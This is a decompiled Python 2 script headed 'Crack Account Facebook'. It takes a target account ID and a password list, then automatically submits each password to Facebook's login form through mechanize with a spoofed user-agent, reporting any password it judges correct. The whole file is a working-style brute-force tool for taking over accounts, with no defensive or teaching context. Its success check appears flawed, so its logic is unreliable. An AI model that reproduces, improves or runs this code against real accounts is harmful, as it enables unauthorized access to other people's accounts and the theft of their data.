# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Apr  9 2022, 12:24:03) 
# [GCC Android (7714059, based on r416183c1) Clang 12.0.8 (https://android.google
# Embedded file name: <seni>
import sys, random, mechanize, cookielib
print '\n============================='
print 'Crack Account Facebook'
print '============================='
print 'Example =>  '
print 'Input ID : 1000\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97'
print 'Input Passwordlist : password.txt'
print '============================='
email = str(raw_input(' Input ID : '))
passwordlist = str(raw_input('Input Passwordlist : '))
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
login = 'https://www.facebook.com/login.php?login_attempt=1'

def attack(password):
    try:
        sys.stdout.write('\r => trying %s.. ' % password)
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        if log == login:
            print '\n\n\n  => Password found .. !!'
            print '\n  [*] Password => %s\n' % password
            sys.exit(1)
    except KeyboardInterrupt:
        print '\n  => Exiting program .. '
        sys.exit(1)


def search():
    global password
    for password in passwords:
        attack(password.replace('\n', ''))


def check():
    global br
    global passwords
    try:
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print '\n[*] Exiting program ..\n'
        sys.exit(1)

    try:
        list = open(passwordlist, 'r')
        passwords = list.readlines()
        k = 0
        while k < len(passwords):
            passwords[k] = passwords[k].strip()
            k += 1

    except IOError:
        print '\n [*] Error: check your password list path \n'
        sys.exit(1)
    except KeyboardInterrupt:
        print '\n [*] Exiting program ..\n'
        sys.exit(1)

    try:
        print ' [*] Account to crack : %s' % email
        print ' [*] Loaded :', len(passwords), 'passwords'
        print ' [*] Cracking, please wait ...'
    except KeyboardInterrupt:
        print '\n [*] Exiting program ..\n'
        sys.exit(1)

    try:
        search()
        attack(password)
    except KeyboardInterrupt:
        print '\n [*] Exiting program ..\n'
        sys.exit(1)


if __name__ == '__main__':
    check()